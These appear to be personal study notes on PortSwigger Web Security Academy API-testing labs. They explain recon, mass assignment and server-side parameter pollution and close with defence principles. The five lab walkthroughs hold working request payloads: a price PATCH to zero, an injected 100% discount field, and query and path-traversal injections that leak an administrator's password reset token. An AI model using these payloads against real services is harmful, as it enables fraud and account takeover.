# API Testing Notes — PortSwigger Web Security Academy

---

## WHAT IS API TESTING?

Modern web apps are rarely just "a website." The front-end (what you see in
the browser) usually talks to a back-end through an **API** — a defined set
of HTTP endpoints that accept and return structured data (almost always
JSON these days).

```
Browser  →  HTML/CSS/JS (the front-end)
            ↓ makes requests to
API      →  /api/user/wiener, /api/products/1/price, /api/checkout...
            ↓ talks to
Back-end →  database, business logic, internal services
```

> 📝 **The critical insight of this whole module:** the front-end UI only
> exercises a SUBSET of what the API actually supports. A web page might only
> ever send `GET` requests to `/api/products/1/price` — but that doesn't mean
> the endpoint doesn't also accept `PATCH`, `DELETE`, or extra parameters the
> UI never sends. API testing means testing the API directly, independent of
> what the front-end happens to use it for.

This module is about REST-style APIs specifically (the most common style on
the modern web), though the underlying concepts apply to GraphQL, SOAP, and
others too (those get their own dedicated Academy modules).

---

## WHAT IS REST?

REST (Representational State Transfer) is a convention — not a strict
protocol — for structuring APIs around resources and HTTP methods.

```
Resource: a user        → /api/user/{username}
Resource: a product     → /api/products/{id}
Resource: a price       → /api/products/{id}/price
```

| HTTP Method | Typical meaning |
|---|---|
| `GET` | Retrieve a resource |
| `POST` | Create a new resource |
| `PUT` | Replace a resource entirely |
| `PATCH` | Apply a partial update to a resource |
| `DELETE` | Remove a resource |
| `OPTIONS` | Ask the server which methods are supported on this resource |

> 📝 `OPTIONS` is one of the single most useful recon tools in API testing.
> Sending it to ANY endpoint and reading the `Allow:` response header tells
> you every HTTP method the server will accept there — including methods the
> front-end never uses and the UI never reveals.

---

## API RECON — FINDING THE ATTACK SURFACE

Before you can test an API, you need to know it exists. Common discovery
techniques, roughly in order of effort:

### 1. Passive discovery (just use the app)
Browse the application normally with Burp's proxy running. Every API call
the front-end makes shows up in **Proxy > HTTP history**. This is almost
always your starting point.

### 2. API documentation
Many APIs ship with machine-readable documentation — most commonly an
**OpenAPI (formerly "Swagger") specification**, a JSON or YAML file describing
every endpoint, method, parameter, and response shape.

```
Common documentation paths to check:
/api
/api/v1
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/api-docs
/.well-known/
```

> 📝 Documentation is often interactive — tools like **Swagger UI** render the
> spec as a clickable interface where you can fill in parameters and fire
> requests directly from the browser. If you find a documentation endpoint,
> always check whether the response can be rendered this way (Burp's
> "Show response in browser" does this nicely).

### 3. JavaScript source review
Front-end JS files frequently construct API URLs dynamically. View page
source, check linked `.js` files, and search for strings like `/api/`,
`fetch(`, `axios.`, or `XMLHttpRequest`.

### 4. Path-shortening / truncation
If you've found one endpoint like `/api/user/wiener`, try removing path
segments one at a time: `/api/user` → `/api`. APIs often respond differently
(or reveal documentation, error context, or a resource listing) at each
shorter path.

### 5. Content discovery / brute-forcing
Use Burp's built-in **Engagement tools → Discover content**, or **Intruder**
with a wordlist of common API path segments, to find endpoints that aren't
linked anywhere in the visible app.

---

## IDENTIFYING AND INTERACTING WITH ENDPOINTS

Once you've found an endpoint, the testing process is mostly about asking:
**"What is this endpoint ACTUALLY willing to do, regardless of what the UI
uses it for?"**

### Identifying supported HTTP methods
```
OPTIONS /api/products/1/price
→ 405 Method Not Allowed
   Allow: GET, PATCH
```
The front-end might only ever call `GET` — but `PATCH` is sitting there,
fully functional, just never exercised by the UI.

### Identifying supported content types
APIs are often built to accept multiple content types (JSON, XML, form data)
even if the front-end always sends one. Switching `Content-Type` can:
- Trigger different (often more revealing) error messages
- Bypass validation logic written for only one format
- Expose a code path with weaker security checks

> 📝 Error messages are a recon goldmine in API testing. A "missing
> Content-Type" or "missing parameter X" error tells you EXACTLY what the
> server expects next. Treat every error as a clue, not a dead end — keep
> iterating based on what the error says is wrong.

---

## FINDING HIDDEN PARAMETERS

APIs frequently accept parameters that the front-end never sends. A classic
giveaway: comparing the response of a `GET` request to the body of the
corresponding `POST`/`PATCH` request for the SAME resource.

```
GET  /api/checkout
→ {"chosen_discount":{"percentage":0},"chosen_products":[...]}

POST /api/checkout   (what the UI actually sends)
→ {"chosen_products":[...]}
   ↑ chosen_discount is MISSING from what the UI sends —
     but the GET response proves the server's data model includes it.
```

If a field appears in a GET/read response but not in the corresponding
write request, that's a strong signal the field is a hidden parameter the
backend will still accept if you add it yourself.

**Tools for hidden parameter discovery:**
- Manual comparison of GET vs POST/PATCH bodies (as above)
- Burp Intruder with a parameter-name wordlist against a known endpoint
- Burp's **Param Miner** extension (BApp Store) — automates this entirely

---

## MASS ASSIGNMENT VULNERABILITIES

Mass assignment happens when an API automatically binds ALL fields in a
client-supplied request body directly onto an internal object — including
fields the client was never supposed to be able to set.

```
Internal "Order" object: { chosen_discount: {percentage}, chosen_products, user_id, status, ... }

Front-end only ever sends: { chosen_products }

But the backend framework does something like:
  order = Order(**request_json)   ← binds EVERY field in the request body

If you add "chosen_discount": {"percentage": 100} to your request body,
the framework binds it onto the Order object exactly like any other field —
because the framework doesn't distinguish "fields we expect from the client"
from "fields that exist on the object."
```

> 📝 Mass assignment is essentially the API version of the "user role
> modifiable in user profile" bug from the Access Control module (`roleid`
> sent in a form the UI never exposes). Same root cause — the backend blindly
> trusts and binds whatever fields show up in the request — just expressed
> through a JSON API instead of an HTML form.

**How to test for it:**
1. Find a GET/read endpoint and a corresponding POST/PATCH/PUT endpoint for
   the same resource
2. Diff their JSON structures — any field present in GET but absent in
   POST/PATCH is a candidate
3. Add that field into your write request with a value that benefits you
   (discount percentage, role ID, price, `isAdmin: true`, etc.)
4. Send it — if the server accepts and applies it, mass assignment confirmed

---

## SERVER-SIDE PARAMETER POLLUTION (SSPP)

SSPP happens when a website embeds **user input directly into a server-side
request to an INTERNAL API**, without properly encoding it. Because the
front-end you're attacking is often just a thin client for an internal
back-end API, your input can end up inside a URL that the front-end builds
and sends onward — and if it's not encoded, you can inject your own
parameters into that internal request.

```
Your input:        username = administrator
Front-end builds:   GET /api/internal/resetPassword?username=administrator&field=email
                                                                              ↑ this part the
                                                                                front-end always
                                                                                appends itself

If your input isn't encoded before being embedded, you can inject INTO
this internal query string:

Your input:        username = administrator&field=reset_token
Front-end builds:   GET /api/internal/resetPassword?username=administrator&field=reset_token&field=email
                                                                            ↑ your injected param
```

Depending on how the internal API parses **duplicate parameters**, your
injected one might be the one that "wins":

| Technology | Behaviour with duplicate params |
|---|---|
| PHP | Last parameter wins |
| ASP.NET | Both values combined (comma-separated) |
| Node.js / Express | First parameter wins |

> 📝 This table matters enormously for testing strategy. If the backend uses
> Node.js/Express semantics (first param wins), injecting a SECOND `username`
> won't override the original — you'd need to either NAME your injected
> parameter differently (override a DIFFERENT field like `field=`) or place
> your injected value FIRST if you have that level of control.

### SSPP in the query string
The classic version — inject `&`, `=`, or `#` characters into a parameter
value to try to add, override, or truncate parameters in the internal
request.

```
& → inject a new parameter
= → inject a value where one wasn't expected
# → truncate the rest of the query string (URL fragment terminator)
```

### SSPP in a REST URL path
Some APIs build an internal request by directly embedding your input into a
URL PATH segment rather than a query string parameter:

```
Front-end:           GET /edit-profile?name=wiener
Internal request:    GET /api/private/users/wiener

Inject path traversal:
Front-end:           GET /edit-profile?name=wiener/../admin
Internal request:    GET /api/private/users/wiener/../admin
                      → normalises to /api/private/users/admin
```

> 📝 This is the SAME path traversal concept from earlier modules (Access
> Control Lab 05's path normalisation bypass), just applied to a SERVER-SIDE
> request the front-end builds on your behalf rather than a client-facing URL.

### SSPP in structured data formats (JSON/XML)
The same idea, but your input lands inside a JSON or XML structure that the
front-end forwards to an internal API. Injecting structural characters
(`"`, `}`, `<`, `>`) can let you add or override fields/elements in that
internal structure. (XML-specific variants of this are covered under XXE's
XInclude attacks.)

---

## API TESTING SOP

### Step 1 — Map the visible attack surface
- Browse the entire app with Burp's proxy running
- Note every distinct API call in Proxy > HTTP history
- Pay attention to JS files that construct API calls dynamically

### Step 2 — Look for documentation
- Try `/api`, `/api/v1`, `/swagger.json`, `/openapi.json`
- Try truncating any known API path one segment at a time
- If found, check if it's interactive (Swagger UI style)

### Step 3 — Enumerate methods per endpoint
- `OPTIONS` every endpoint you've found — read the `Allow:` header
- Try every listed method even if the UI only uses one

### Step 4 — Enumerate content types
- Try sending the same request with different `Content-Type` headers
- Watch for different/more revealing error messages

### Step 5 — Diff read vs write structures
- Compare GET response bodies against POST/PATCH/PUT request bodies for the
  same resource
- Any field present in GET but missing from the write request is a hidden
  parameter candidate

### Step 6 — Test hidden parameters (mass assignment)
- Add candidate fields into your write requests
- Try values that benefit you directly (discounts, roles, prices, flags)

### Step 7 — Test for SSPP
- Find any user input that appears to feed into a server-side request (often
  visible via distinctive error messages, or via behaviour changes when you
  inject `&`, `=`, `#`, `/`, `../`)
- Inject query syntax characters one at a time, observe error message changes
- If path-based, try `../` traversal and watch for "Invalid route" type errors
- Once you find the shape of the internal request, try to redirect it
  entirely to a different internal endpoint

### Step 8 — Build the exploit chain
- API vulnerabilities often chain: discover docs → find hidden endpoint →
  use it to read or modify something you shouldn't → escalate from there

---

## QUICK BURP WORKFLOW

1. Browse the app normally with Burp Suite's browser → build up Proxy
   history
2. Identify API calls (commonly under `/api/` paths) → send interesting ones
   to **Repeater**
3. In Repeater, change the HTTP method to `OPTIONS` → check `Allow:` header
4. Try each allowed method in turn, adjusting `Content-Type` and body as
   needed
5. Use **Engagement tools → Discover content** to brute-force hidden paths
6. Use **Intruder** to fuzz parameter names against a known-good endpoint
7. Install the **Content type converter** BApp to quickly reformat a request
   body between JSON/XML/form-encoded
8. Install **Param Miner** (BApp Store) to automate hidden parameter
   discovery

> 📝 A genuinely useful habit: whenever you see a `GET` and a `POST`/`PATCH`
> hitting the SAME path, always pull up both side by side in Repeater. The
> GET response is very often a more complete picture of the underlying data
> model than the corresponding write request reveals.

---
---

## PORTSWIGGER LABS

---

### #01 — Exploiting an API endpoint using documentation

**URL:** https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation
**Vulnerability:** API documentation is publicly accessible with no authentication, disclosing an undocumented-in-the-UI `DELETE` endpoint
**Aim:** Find the exposed API documentation and delete `carlos`

**Background:**
Updating your email address sends `PATCH /api/user/wiener` with a JSON body.
This confirms the shape of the API: `/api/user/{username}`. Truncating the
path systematically reveals more of the API's structure — including its
self-hosted documentation.

**Analysis:**
```
PATCH /api/user/wiener      {"email":"wiener@test.com"}   → 200 OK (your own update)
PATCH /api/user             {"email":"wiener@test.com"}   → error: no user identifier
PATCH /api                  {"email":"wiener@test.com"}   → returns API documentation!

The documentation lists, among other things:
  DELETE /api/user/{username}

DELETE /api/user/carlos     → 200 OK — carlos deleted, lab solved
```

**Steps:**
1. Log in as `wiener:peter`, update your email, capture the `PATCH /api/user/wiener` request
2. Resend the SAME request with `/wiener` removed from the path → note the error
3. Resend again with `/user` also removed (now just `/api`) → API documentation is returned
4. Inspect the documentation for a `DELETE` endpoint matching `/api/user/{username}`
5. Send `DELETE /api/user/carlos`

> 📝 The path-truncation technique here is genuinely one of the highest-value
> recon habits in this whole module. Many APIs self-document at the "root" of
> their path structure — truncate aggressively and see what falls out.

---

### #02 — Finding and exploiting an unused API endpoint

**URL:** https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint
**Vulnerability:** A `PATCH` method is fully functional on a pricing endpoint that the front-end only ever uses for `GET`
**Aim:** Buy the "Lightweight l33t Leather Jacket" by setting its price to $0.00

**Background:**
Viewing a product page triggers `GET /api/products/{id}/price`. The UI never
sends anything but `GET` to this endpoint — but that doesn't mean other
methods aren't supported.

**Analysis:**
```
GET /api/products/1/price
→ {"price":"$1337.00","message":"30 people have viewed this item..."}

OPTIONS /api/products/1/price
→ 405 Method Not Allowed
   Allow: GET, PATCH          ← PATCH is supported, just never used by the UI

PATCH /api/products/1/price   (no Content-Type, no body)
→ error: Content-Type must be application/json

PATCH /api/products/1/price   Content-Type: application/json   body: {}
→ error: missing 'price' parameter

PATCH /api/products/1/price   Content-Type: application/json   body: {"price":0}
→ 200 OK   {"price":"$0.00"}
```

**Steps:**
1. Log in as `wiener:peter`, view the leather jacket product page, capture the price `GET` request
2. Send `OPTIONS` to the same URL → confirm `PATCH` is allowed
3. Send `PATCH` with no body → read the Content-Type error
4. Add `Content-Type: application/json` and an empty `{}` body → read the missing-parameter error
5. Add `{"price": 0}` → price is now $0.00
6. Add the jacket to your cart and place the order

> 📝 The error messages here LITERALLY tell you what to do at every step —
> "wrong content type" then "missing parameter." This is the core lesson of
> the whole module: APIs that return descriptive errors are handing you a
> roadmap, one HTTP response at a time.

---

### #03 — Exploiting a mass assignment vulnerability

**URL:** https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability
**Vulnerability:** The checkout API accepts a `chosen_discount` field the front-end never sends, but which the backend will still apply
**Aim:** Buy the "Lightweight l33t Leather Jacket" via a 100% discount you invented yourself

**Background:**
Adding the jacket to your basket and attempting checkout fails — insufficient
funds. But comparing the `GET /api/checkout` response (which shows your full
order object) against what the UI actually `POST`s reveals a discrepancy.

**Analysis:**
```
GET /api/checkout
→ {
     "chosen_discount": {"percentage": 0},
     "chosen_products": [
       {"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}
     ]
   }

POST /api/checkout   (what the UI actually sends when you click "Place order")
→ {
     "chosen_products": [{"product_id":"1","quantity":1}]
   }
   ↑ chosen_discount is completely absent from the UI's own POST body —
     but the GET response proves the server's Order object has this field.

Exploit — add chosen_discount back into the POST body yourself:
POST /api/checkout
→ {
     "chosen_discount": {"percentage": 100},
     "chosen_products": [{"product_id":"1","quantity":1}]
   }
→ 200 OK — order placed completely free
```

**Steps:**
1. Log in as `wiener:peter`, add the leather jacket to your basket
2. Attempt to place the order → confirm it fails (insufficient funds)
3. Capture both `GET /api/checkout` and the failed `POST /api/checkout`
4. Diff their JSON bodies — note `chosen_discount` is present in GET, absent in POST
5. Resend the POST with `"chosen_discount": {"percentage": 100}` added
6. Confirm the order is placed for $0.00

> 📝 This is the textbook definition of mass assignment, and it's worth
> internalising the GENERAL pattern, not just this specific field name: any
> time a GET/read response shows you more structure than the corresponding
> write request uses, that extra structure is worth testing as an injectable
> field.

---

### #04 — Exploiting server-side parameter pollution in a query string

**URL:** https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string
**Vulnerability:** The password-reset front-end embeds your `username` input unencoded into an internal API query string, letting you inject a second parameter
**Aim:** Log in as `administrator` and delete `carlos`

**Background:**
Submitting "Forgot password" for `administrator` triggers `POST
/forgot-password`. Internally, the front-end forwards your username to an
internal password-reset API as a query parameter. Because your input isn't
encoded before being embedded, you can inject additional query syntax into
that internal request.

**Analysis:**
```
POST /forgot-password
csrf=...&username=administrator
→ {"result":"a***@normal-...","type":"email"}
   (confirms an email reset notice was "sent" — but we have no access to it)

Inject a second parameter via the username value itself:
csrf=...&username=administrator&field=reset_token
   ↑ when URL-encoded as a single form value, this becomes:
     username=administrator%26field%3Dreset_token
   ↑ the front-end embeds this UNENCODED into its internal request, so the
     internal API sees TWO parameters: username=administrator AND field=reset_token

→ {"result":"rugeczaaoaoyr0t7sqdcj5095vmdxrax","type":"reset_token"}
   ↑ the internal API returns the password reset token directly, because
     our injected "field=reset_token" overrode the front-end's own default
     "field=email"
```

**Steps:**
1. Trigger "Forgot password" for `administrator`, capture `POST /forgot-password` in Repeater
2. Resend the request to confirm consistent baseline behaviour
3. Try injecting `#`, `&`, `=` into the username value to observe how the app reacts
4. Once you confirm a `field` parameter exists internally (often revealed via
   a "Field not specified" or "Invalid field" error after truncating with `#`),
   inject `&field=reset_token` into the username value
5. The response now contains the actual reset token
6. Navigate to `/forgot-password?reset_token={token}`, set a new password for `administrator`
7. Log in as `administrator`, delete `carlos`

> 📝 The trailing `#` in some writeups of this lab serves a specific purpose:
> it tells the FRONT-END "everything after this is just a URL fragment, don't
> send it on" — which truncates whatever the front-end was going to append
> after your input (like its own `&field=email`), letting your injected
> `&field=reset_token` be the only `field` parameter that survives.

---

### #05 — Exploiting server-side parameter pollution in a REST URL

**URL:** https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-rest-url
**Vulnerability:** The same password-reset flow embeds your `username` input unencoded into an internal API's URL PATH (not just a query string) — enabling path traversal into a completely different internal endpoint
**Aim:** Log in as `administrator` and delete `carlos`

**Background:**
This time, your username value is placed directly into a URL PATH segment of
an internal request, rather than a query parameter. That makes the bug a
path traversal vector instead of a parameter-injection one — you can
navigate the internal API's directory structure using `../` sequences.

**Analysis:**
```
POST /forgot-password   username=administrator#
→ "Invalid route" error, mentioning an API definition
   (confirms input is placed in a URL PATH; the # truncated trailing path data)

POST /forgot-password   username=administrator?     (URL-encoded ?)
→ "Invalid route" error
   (confirms path placement — ? would start a query string, truncating the path)

POST /forgot-password   username=./administrator
→ same response as the original request
   (confirms the path is being normalised — ./ is a no-op path segment)

POST /forgot-password   username=../administrator
→ "Invalid route" error
   (confirms path traversal moves us OUTSIDE the expected directory)

Walking further up reveals the internal API root. Requesting a common
documentation filename at that level discloses the user-lookup route:
POST /forgot-password   username=../../../../openapi.json#
→ error referencing: /api/internal/v1/users/{username}/field/{field}

Now we know the FULL internal route shape, including a {field} path segment.
Chain a traversal that lands EXACTLY on that route, with field set to the
password reset token field:

POST /forgot-password
username=foobar/../../../../..//api/internal/v1/users/administrator/field/passwordResetToken#

→ {"administrator's reset token here"}
```

**Steps:**
1. Trigger "Forgot password" for `administrator`, capture the request in Repeater
2. Try `administrator#` → "Invalid route" (confirms path placement + truncation)
3. Try URL-encoded `administrator?` → same error (confirms path, not query, placement)
4. Try `./administrator` → behaves like the original (confirms path normalisation)
5. Try `../administrator` → "Invalid route" (confirms traversal moves outside expected dir)
6. Walk upward with more `../` until you can request a documentation filename
   (e.g. `../../../../openapi.json#`) to disclose the internal route format
7. Once you know the route shape (`/api/internal/v1/users/{username}/field/{field}`),
   craft a traversal path that lands on it directly, requesting
   `field/passwordResetToken` for `administrator`
8. Use the disclosed token at `/forgot-password?reset_token={token}` to set a new password
9. Log in as `administrator`, delete `carlos`

> 📝 This lab is the natural "next level" after Lab 04: same root cause
> (unescaped user input embedded into a server-side request), but here it's a
> URL PATH rather than a query string — which means your toolkit shifts from
> "inject `&`/`=`" to "inject `../`." Always test BOTH shapes whenever you
> suspect SSPP; the placement (path vs query) determines which technique
> applies.

---

## REFERENCE — API TESTING QUICK MAP

| Lab pattern | What's broken | Fix |
|---|---|---|
| Public API documentation | No access control on `/api` doc endpoint | Require authentication for any documentation describing privileged operations |
| Unused-but-functional method | Access control applied per-UI-flow, not per-endpoint | Enforce the same authorization checks regardless of which method reaches the handler |
| Mass assignment | Backend blindly binds every field in a request body to an internal object | Use an explicit allow-list of client-settable fields; never auto-bind entire request bodies |
| SSPP — query string | User input embedded unescaped into an internal request's query string | URL-encode all user input before embedding it in any server-side request |
| SSPP — REST path | User input embedded unescaped into an internal request's URL path | Validate/normalise path segments; never directly concatenate user input into an internal URL path |

---

## REFERENCE — DEFENCE PRINCIPLES

1. **Treat your API as part of your attack surface, not an implementation
   detail** — anything reachable over HTTP is reachable by an attacker,
   documented or not
2. **Apply authorization at the endpoint level, for every method** — not just
   for the methods the current front-end happens to use
3. **Never auto-bind entire request bodies onto internal objects** — use
   explicit allow-lists for which fields a client can set
4. **Always URL-encode user input before embedding it in any server-side
   request** — whether that's a query string or a URL path
5. **Don't rely on the front-end to be the only caller of your API** — assume
   every endpoint will eventually be called directly, with arbitrary methods,
   headers, and bodies
6. **Minimise what error messages disclose** — descriptive errors are great
   for your own developers and even better for an attacker fingerprinting
   your internal API shape
